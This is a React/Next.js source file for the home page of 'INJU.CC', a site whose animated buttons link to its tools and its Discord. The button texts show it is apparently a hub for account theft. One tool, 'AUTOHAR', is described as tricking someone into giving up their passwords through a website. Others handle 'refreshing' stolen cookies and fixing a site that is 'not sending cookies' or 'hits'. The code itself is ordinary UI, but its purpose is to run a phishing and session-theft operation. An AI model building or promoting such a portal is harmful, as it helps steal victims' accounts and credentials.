import { CircularButton } from "@/components/ui/circular-button";
import { FloatingDots } from "@/components/ui/floating-dots";
import { FloatingSphere } from "@/components/ui/floating-sphere";
import { Moon, Sun } from "@/components/ui/celestial-bodies";
import { motion } from "framer-motion";

const buttons = [
  { id: 1, label: "INJU.CC", info: "This is the main website to the inju.cc domain, if you are new please follow troubleshooting steps", href: "https://inju.cc/u/MainControlPage" },
  { id: 2, label: "DISCORD", info: "Join the Offical server for downtimes, updates, and more!!!", href: "https://discord.gg/injuv3" },
  { id: 3, label: "AUTOHAR", info: "Autohar is a way of tricking someone into giving you there ps through a website (AUTOHAR IS NOT MINE)", href: "https://bloxtools.in/controlPage/create" },
  { id: 4, label: "REFRESHER", info: "Refresh your cookies that you get to prevent theft over others if wanted", href: "https://inju.cc/tools/refresher" },
  { id: 5, label: "TROUBLESHOOT", info: "If you are new or if site is not sending cookies, or hit title is something other than 'INJURIES' Use this", href: "https://discord.com/channels/1286805719911370783/1333224210398445588" },
  { id: 6, label: "YOUTUBE", info: "We currently dont have one at the moment", href: "/control" }
];

export default function Home() {
  return (
    <div className="min-h-screen bg-black flex items-center justify-center overflow-hidden">
      <FloatingSphere />
      <FloatingDots />
      <Sun />
      <Moon />
      <div className="relative w-[600px] h-[600px] max-w-full max-h-full">
        {/* Pulsating Title */}
        <motion.h1
          className="absolute text-6xl font-bold text-white z-10"
          style={{
            top: "calc(50% - 96px)", // 1 inch up
            left: "calc(50% - 72px)", // 1 inch left, then 0.25 inch right (96px - 72px)
          }}
          animate={{
            scale: [1, 1.1, 1],
            opacity: [1, 0.8, 1],
          }}
          transition={{
            duration: 2,
            repeat: Infinity,
            ease: "easeInOut",
          }}
        >
          INJU
        </motion.h1>

        {/* Circular Buttons */}
        {buttons.map((button, index) => {
          const angle = (index * 60 * Math.PI) / 180;
          const radius = 200; // Distance from center
          const x = Math.cos(angle) * radius;
          const y = Math.sin(angle) * radius;

          return (
            <div
              key={button.id}
              className="absolute top-1/2 left-1/2"
              style={{
                transform: `translate(calc(-50% + ${x}px), calc(-50% + ${y}px))`,
              }}
            >
              <CircularButton
                label={button.label}
                info={button.info}
                href={button.href}
              />
            </div>
          );
        })}
      </div>
    </div>
  );
}